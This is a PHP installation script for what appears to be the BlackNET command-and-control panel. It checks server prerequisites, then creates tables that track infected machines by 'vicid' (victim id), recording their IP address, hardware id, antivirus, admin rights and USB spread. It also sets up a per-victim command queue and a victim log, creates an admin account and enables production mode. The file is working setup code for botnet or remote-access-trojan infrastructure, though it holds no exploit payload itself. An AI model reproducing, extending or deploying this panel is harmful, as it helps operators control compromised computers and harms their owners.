<?php

$utils = new BlackNET\Utils();

$database = new BlackNET\Database();

$install = new BlackNET\Update($database, $utils);

$php_alert =  "";

if (PHP_VERSION_ID < 70200) {
    $php_alert = $utils->alert("Please update your PHP to 7.2", "danger", "times-circle");
}

$required_libs = [
    "JSON" => "json",
    "PDO" => "pdo",
    "MySQL" => "pdo_mysql",
    "Mbstring" => "mbstring",
    "Phar" => "phar",
    "SPL" => "spl",
    "Zip" => "zip"
];

$is_installed = [];

foreach ($required_libs as $lib_name => $lib_id) {
    if (extension_loaded($lib_id) == true) {
        array_push($is_installed, ["name" => $lib_name, "status" => "Installed", "bool" => true]);
    } else {
        array_push($is_installed, ["name" => $lib_name, "status" => "Missing", "bool" => false]);
    }
}

$writable_folders = ["scripts", "plugins", "upload", "backups"];

$is_writable = [];

foreach ($writable_folders as $folder_name) {
    if (is_writable($folder_name) == true) {
        array_push($is_writable, [
            "name" => $folder_name,
            "status" => "Writable",
            "bool" => true
        ]);
    } else {
        array_push($is_writable, [
            "name" => $folder_name,
            "status" => "Not Writable",
            "bool" => false
        ]);
    }
}

$disabled = "";

if (
    $utils->findKeyValue($is_installed, "bool", false) ||
    $utils->findKeyValue($is_writable, "bool", false) ||
    PHP_VERSION_ID < 70200
) {
    $disabled = "disabled";
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    try {
        $users = [
            ["id", "int(11)", "unsigned", "NOT NULL"],
            ["username", "varchar(30)", "NOT NULL"],
            ["password", "varchar(100)", "NOT NULL"],
            ["email", "varchar(255)", "NOT NULL"],
            ["role", "tinyint(1)", "NOT NULL"],
            ["s2fa", "tinyint(1)", "NOT NULL"],
            ["secret", "varchar(50)", "NULL"],
            ["sqenable", "tinyint(1)", "NOT NULL"],
            ["question", "int(11)", "NOT NULL"],
            ["answer", "varchar(255)", "NULL"],
            ["last_login", "timestamp", "NOT NULL", "DEFAULT CURRENT_TIMESTAMP", "ON UPDATE CURRENT_TIMESTAMP()"],
            ["failed_login", "int(11)", "NOT NULL"],
        ];

        $clients = [
            ["id", "int(11)", "unsigned", "NULL"],
            ["vicid", "varchar(20)", "NULL"],
            ["hwid", "varchar(50)", "NULL"],
            ["ipaddress", "varchar(50)", "NULL"],
            ["computername", "varchar(150)", "NULL"],
            ["country", "varchar(5)", "NULL"],
            ["os", "varchar(225)", "NULL"],
            ["cpu", "varchar(225)", "NULL"],
            ["gpu", "varchar(225)", "NULL"],
            ["ramsize", "varchar(225)", "NULL"],
            ["insdate", "varchar(15)", "NULL"],
            ["update_at", "varchar(50)", "NULL"],
            ["pings", "int(11)", "NULL"],
            ["antivirus", "varchar(225)", "NULL"],
            ["version", "varchar(20)", "NULL"],
            ["status", "varchar(10)", "NULL"],
            ["is_usb", "varchar(5)", "NULL"],
            ["is_admin", "varchar(5)", "NULL"],
        ];

        $commands = [
            ["id", "int(11)", "unsigned", "NULL"],
            ["vicid", "varchar(20)", "NULL"],
            ["command", "text", "NULL"],
        ];

        $tokens = [
            ["id", "int(11)", "unsigned", "NOT NULL"],
            ["username", "varchar(30)", "NOT NULL"],
            ["token", "varchar(50)", "NOT NULL"],
            ["created_at", "timestamp", "NOT NULL", "DEFAULT CURRENT_TIMESTAMP", "ON UPDATE CURRENT_TIMESTAMP()"],
        ];

        $logs = [
            ["id", "int(11)", "unsigned", "NOT NULL"],
            ["time", "timestamp", "NOT NULL", "DEFAULT CURRENT_TIMESTAMP", "ON UPDATE CURRENT_TIMESTAMP()"],
            ["vicid", "varchar(20)", "NOT NULL"],
            ["type", "varchar(10)", "NOT NULL"],
            ["message", "text", "NOT NULL"],
        ];

        $settings = [
            ["id", "int(11)", "unsigned", "NOT NULL"],
            ["setting_key", "varchar(50)", "NOT NULL"],
            ["setting_value", "varchar(225)", "NOT NULL"],
        ];

        $install->createTable("users", $users);

        $install->createTable("clients", $clients);

        $install->createTable("commands", $commands);

        $install->createTable("tokens", $tokens);

        $install->createTable("logs", $logs);

        $install->createTable("settings", $settings);

        $install->insertValue("users", [
            "id" => 1,
            "username" => $utils->sanitize($_POST["username"]),
            "password" => password_hash($utils->sanitize($_POST["password"]), PASSWORD_BCRYPT),
            "email" => $utils->sanitize($_POST["email"]),
            "role" => 1,
            "s2fa" => 0,
            "secret" => null,
            "sqenable" => 0,
            "question" => 1,
            "answer" => null,
            "last_login" => date("Y-m-d H:i:s"),
            "failed_login" => 0,
        ]);

        $install->insertValue("settings", [
            "id" => 1,
            "setting_key" => "panel_status",
            "setting_value" => 1,
        ]);

        $install->insertValue("settings", [
            "id" => 2,
            "setting_key" => "delete_backup",
            "setting_value" => 0,
        ]);

        $install->insertValue("settings", [
            "id" => 3,
            "setting_key" => "recaptcha_status",
            "setting_value" => 0,
        ]);

        $install->insertValue("settings", [
            "id" => 4,
            "setting_key" => "recaptchapublic",
            "setting_value" => "UpdateYourCode",
        ]);

        $install->insertValue("settings", [
            "id" => 5,
            "setting_key" => "recaptchaprivate",
            "setting_value" => "UpdateYourCode",
        ]);

        $install->insertValue("settings", [
            "id" => 6,
            "setting_key" => "smtp_status",
            "setting_value" => 0,
        ]);

        $install->insertValue("settings", [
            "id" => 7,
            "setting_key" => "smtp_host",
            "setting_value" => "smtp.localhost.com",
        ]);

        $install->insertValue("settings", [
            "id" => 8,
            "setting_key" => "smtp_username",
            "setting_value" => "localhost@gmail.com",
        ]);

        $install->insertValue("settings", [
            "id" => 9,
            "setting_key" => "smtp_password",
            "setting_value" => $utils->base64EncodeUrl("password"),
        ]);

        $install->insertValue("settings", [
            "id" => 10,
            "setting_key" => "smtp_security",
            "setting_value" => "ssl",
        ]);

        $install->insertValue("settings", [
            "id" => 11,
            "setting_key" => "smtp_port",
            "setting_value" => "461",
        ]);

        $install->isPrimary("users", "id");

        $install->isAutoinc("users", ["id", "int(11)", "unsigned", "NOT NULL"]);

        $install->isPrimary("clients", "id");

        $install->isAutoinc("clients", ["id", "int(11)", "unsigned", "NOT NULL"]);

        $install->isPrimary("commands", "id");

        $install->isAutoinc("commands", ["id", "int(11)", "unsigned", "NOT NULL"]);

        $install->isPrimary("tokens", "id");

        $install->isAutoinc("tokens", ["id", "int(11)", "unsigned", "NOT NULL"]);

        $install->isPrimary("logs", "id");

        $install->isAutoinc("logs", ["id", "int(11)", "unsigned", "NOT NULL"]);

        $install->isPrimary("settings", "id");

        $install->isAutoinc("settings", ["id", "int(11)", "unsigned", "NOT NULL"]);

        // Enable Production Mode
        /* -------------------------- */
        $env_file = APP_PATH . "config/environment.php";

        $env_file_content = file_get_contents($env_file);

        $env_file_content = preg_replace("/installation/", "production", $env_file_content, 1);

        file_put_contents($env_file, $env_file_content);
        /* -------------------------- */

        $msg = true;
    } catch (PDOException $ex) {
        $error = $ex->getMessage();
        error_log($ex->getMessage() . "\n", 3, LOGS_PATH);
    }
}

$page = "installPage";
